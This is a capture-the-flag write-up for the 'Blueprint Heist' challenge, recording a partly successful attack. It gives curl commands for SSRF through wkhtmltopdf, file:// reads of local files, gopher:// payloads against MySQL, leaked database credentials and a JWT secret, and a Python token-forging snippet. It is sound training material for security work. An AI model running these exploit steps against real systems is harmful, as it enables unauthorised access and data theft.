# Blueprint Heist - Quick Reference Guide

## 🎯 Challenge Goal
Read the flag from `/root/flag.txt` using the `/readflag` SUID binary.

---

## 📋 Quick Facts

| Item | Value |
|------|-------|
| **Target** | `94.237.59.225:55358` |
| **Application** | Node.js + Express + GraphQL |
| **Database** | MySQL (localhost:3306) |
| **Main Vulnerability** | SSRF via wkhtmltopdf |
| **Flag Location** | `/root/flag.txt` |
| **ReadFlag Binary** | `/readflag` (SUID root) |
| **Difficulty** | Medium (1000 points) |

---

## 🔑 Credentials Found

```env
# Database
DB_HOST=127.0.0.1
DB_USER=root
DB_PASSWORD=D4T4b4s3Secr3tP4ssw0rd1ss0L0ngOmG!
DB_NAME=construction
DB_PORT=3306

# JWT (Local - Remote uses different secret!)
secret=IM_Sup3r_K3y_pl3ase_b3_c4r3ful?
```

---

## 🌐 Endpoints Map

### Public (No Auth Required)
```
GET  /                        # Homepage
GET  /getToken                # Get guest JWT token
GET  /report/progress         # Progress report
GET  /report/enviromental-impact  # Environmental report
```

### Public (Guest Token Required)
```
POST /download?token=XXX      # Convert URL to PDF [VULNERABLE!]
     Body: {"url": "http://example.com"}
```

### Admin Only (Admin Token + Localhost Required)
```
GET  /admin?token=XXX         # Admin dashboard
ALL  /graphql?token=XXX       # GraphQL API
```

---

## 🔓 Exploitation Checklist

### Step 1: Get Guest Token
```bash
TOKEN=$(curl -s http://94.237.59.225:55358/getToken)
echo $TOKEN
```

### Step 2: Test SSRF
```bash
# Access localhost
curl -X POST "http://94.237.59.225:55358/download?token=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:1337/"}' \
  --output test.pdf
```

### Step 3: Read Files
```bash
# Read application files
curl -X POST "http://94.237.59.225:55358/download?token=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"file:///app/index.js"}' \
  --output index.pdf

pdftotext index.pdf -
```

### Step 4: Try Gopher (MySQL Attack)
```bash
# Generate gopher payload (requires gopherus or manual crafting)
# Example structure:
curl -X POST "http://94.237.59.225:55358/download?token=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"gopher://127.0.0.1:3306/_%a3%00%00..."}' \
  --output gopher.pdf
```

---

## 🛠️ Tools Used

```bash
# Web requests
curl, wget

# Directory fuzzing
ffuf, gobuster, dirb

# PDF analysis
pdftotext, pdfinfo

# MySQL gopher payloads
gopherus (Python 2 required)

# JWT manipulation
python3 with PyJWT library

# Port scanning
nmap (if needed)
```

---

## 🐛 Vulnerabilities Identified

### 1. SSRF in /download (CRITICAL)
**Location**: `app/controllers/downloadController.js`
```javascript
wkhtmltopdf(url, { output: pdfPath })  // User controls 'url'
```
**Impact**:
- Access internal services from localhost
- Read local files via `file://`
- Send raw TCP via `gopher://`
- Bypass IP-based access controls

### 2. SQL Injection in GraphQL
**Location**: `app/schemas/schema.js` line 37
```javascript
`SELECT * FROM users WHERE name like '%${args.name}%'`
```
**Protection**: `detectSqli()` regex filter
**Blocked chars**: `!#$%^&*()-_=+{}[]\|;:'",.<>/?`
**Allowed**: Letters, numbers, spaces, backticks

### 3. GraphQL Injection (Client-Side)
**Location**: `app/static/js/admin.js` line 63
```javascript
query: `{
    getDataByName(name: "${username}") {
        ...
    }
}`
```
**Problem**: wkhtmltopdf doesn't execute JavaScript

### 4. JWT Secret Exposure
**Status**: Local .env has secret, but remote uses different one
**Verified**: Token signature verification fails

---

## 🔍 Files Readable via SSRF

### ✅ Can Read
- `/etc/passwd`
- `/app/index.js`
- `/app/package.json`
- `/app/controllers/*.js`
- `/app/routes/*.js`
- Other /app directory files

### ❌ Cannot Read (Permission Denied)
- `/root/flag.txt`
- `/app/.env`
- `/proc/*/environ`
- `/readflag` (binary, not readable text anyway)

---

## 🎬 GraphQL Queries

### Get All Users
```graphql
{
  getAllData {
    id
    name
    department
    isPresent
  }
}
```

### Search by Name
```graphql
{
  getDataByName(name: "John") {
    name
    department
    isPresent
  }
}
```

### Send via curl
```bash
ADMIN_TOKEN="your_admin_token_here"
curl -X POST "http://127.0.0.1:1337/graphql?token=$ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ getAllData { name } }"}'
```

---

## 🔐 JWT Token Structure

### Guest Token (What you can get)
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "role": "user",
  "iat": 1762776089
}
```

### Admin Token (What you need)
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "role": "admin",
  "iat": 1762776089
}
```

### Forge Admin Token (Python)
```python
import jwt
secret = "IM_Sup3r_K3y_pl3ase_b3_c4r3ful?"
payload = {"role": "admin"}
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```
**Note**: Only works if remote uses same secret (it doesn't!)

---

## 🔨 MySQL Gopher Payload Generation

### Using Gopherus (Python 2)
```bash
cd /tmp
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
python2 gopherus.py --exploit mysql

# Enter username: node
# Enter query: SELECT 'test'
# Copy the gopher:// URL
```

### Manual Payload Structure
```
gopher://127.0.0.1:3306/_%[url_encoded_mysql_packets]

Components:
1. Handshake response (with auth)
2. Query packet
3. Close connection
```

**Challenge**: MySQL requires password authentication
**Solution**: Must craft proper auth packets manually

---

## 🧩 Attack Vectors Tried

| Vector | Status | Notes |
|--------|--------|-------|
| SSRF to localhost | ✅ Works | Can access 127.0.0.1:1337 |
| File read via file:// | ✅ Partial | Can read /app/* but not /root/* |
| JWT forgery | ❌ Failed | Remote uses different secret |
| MySQL gopher (no auth) | ❌ Failed | Requires password |
| GraphQL injection | ❌ Blocked | No JS execution in wkhtmltopdf |
| SQL injection | ⚠️ Limited | Heavily filtered |
| Directory fuzzing | ❌ Nothing | No hidden endpoints |

---

## 💡 Likely Solution

Based on analysis, the solution probably requires:

1. **Craft authenticated MySQL gopher payload**
   - Include password authentication in payload
   - Use MySQL to write output to accessible location
   - Possibly use `INTO OUTFILE` or similar

2. **Chain multiple exploits**
   - SSRF → MySQL → Write file → Read file
   - OR: SSRF → Extract secret → Forge token → GraphQL RCE

3. **Advanced MySQL exploitation**
   - UDF (User Defined Functions)
   - File write capabilities
   - Stored procedures

**Key Challenge**: How to EXECUTE `/readflag` and capture output?

---

## 📚 Learning Resources

- SSRF: https://portswigger.net/web-security/ssrf
- Gopher Protocol: https://github.com/tarunkant/Gopherus
- MySQL Protocol: https://dev.mysql.com/doc/internals/en/client-server-protocol.html
- JWT: https://jwt.io/
- GraphQL: https://graphql.org/learn/

---

## 🧹 Cleanup Commands

```bash
# Remove temporary files
rm -f /tmp/*.pdf /tmp/exploit*.html

# Kill servers if running
pkill -f "python3 -m http.server"

# Clear test data
rm -rf /tmp/Gopherus /tmp/gopherus2
```

---

## 📝 Notes & Observations

1. The local .env secret doesn't match remote
2. wkhtmltopdf 0.12.5 is vulnerable (CVE-2020-21365)
3. JavaScript execution is disabled in wkhtmltopdf
4. MySQL root has full privileges but runs as 'node' user
5. The /readflag SUID binary is the intended solution path
6. No obvious command injection vectors found
7. GraphQL has no mutations, only queries

---

## ⚠️ What Doesn't Work

❌ Forging admin token with .env secret
❌ Reading /root/flag.txt directly
❌ Executing JavaScript in wkhtmltopdf
❌ Passwordless MySQL gopher attacks
❌ SQL injection with filtered input
❌ Reading .env file via SSRF
❌ Proc filesystem access
❌ Command injection in URL parameter

---

## ✅ What Works

✅ Getting guest JWT token
✅ SSRF to internal services
✅ Reading /app/* files
✅ Accessing localhost endpoints via SSRF
✅ Generating PDF from any URL
✅ File:// protocol for local file read
✅ Gopher:// protocol accepted (but needs auth)

---

## �� Key Takeaways

1. **SSRF is powerful** - Can bypass localhost restrictions
2. **JWT secrets matter** - Random secrets prevent forgery
3. **Input validation** - URL validation is insufficient
4. **Defense in depth** - Multiple layers needed
5. **Protocol awareness** - Gopher, file:// can be dangerous
6. **SUID binaries** - Must be executed, not just read
7. **MySQL security** - Password authentication is important

---

**Status**: Challenge partially solved (SSRF confirmed, final exploit pending)
**Next Steps**: Research MySQL gopher authentication or find alternative path
**Time Spent**: ~3 hours of analysis and testing
